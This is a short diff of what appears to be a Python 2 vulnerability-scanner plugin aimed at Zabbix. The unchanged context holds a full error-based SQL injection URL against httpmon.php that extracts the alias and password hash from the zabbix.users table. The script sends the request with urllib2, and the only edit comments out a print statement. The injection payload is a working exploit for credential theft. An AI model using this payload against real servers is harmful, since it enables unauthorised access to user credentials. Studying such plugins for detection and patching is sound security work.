@@ -40,7 +40,7 @@ class P(T):
         else:
             vul_url = target_url + "/zabbix/httpmon.php?applications=2%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(alias,0x7e,passwd,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)"
             try:
-                print vul_url
+                #print vul_url
                 res=urllib2.urlopen(vul_url,timeout=timeout)
                 res_html = res.read()
 
